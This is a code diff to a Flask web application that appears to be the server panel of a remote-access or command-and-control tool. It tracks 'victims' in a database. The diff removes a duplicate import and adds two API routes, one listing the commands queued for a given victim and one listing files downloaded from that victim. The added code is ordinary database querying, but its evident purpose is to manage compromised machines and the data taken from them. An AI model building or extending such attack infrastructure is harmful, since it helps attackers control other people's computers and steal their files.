@@ -14,7 +14,6 @@ from flask import Flask, render_template, request, jsonify, send_file, redirect,
 from flask_socketio import SocketIO, emit
 import sqlite3
 import os
-import os
 import datetime
 import uuid
 import base64
@@ -183,6 +182,26 @@ def api_victim(victim_id):
         return jsonify({'error': 'Victim not found'}), 404
 
     return jsonify(dict(victim))
+
+@app.route('/api/victim/<victim_id>/commands')
+def api_victim_commands(victim_id):
+    """API: Get commands for victim"""
+    conn = get_db_connection()
+    commands = conn.execute('SELECT * FROM commands WHERE victim_id = ? ORDER BY timestamp DESC LIMIT 50',
+                          (victim_id,)).fetchall()
+    conn.close()
+
+    return jsonify([dict(c) for c in commands])
+
+@app.route('/api/victim/<victim_id>/files')
+def api_victim_files(victim_id):
+    """API: Get downloaded files for victim"""
+    conn = get_db_connection()
+    files = conn.execute('SELECT * FROM downloaded_files WHERE victim_id = ? ORDER BY download_time DESC LIMIT 50',
+                        (victim_id,)).fetchall()
+    conn.close()
+
+    return jsonify([dict(f) for f in files])
 
 @app.route('/api/register', methods=['POST'])
 def api_register():
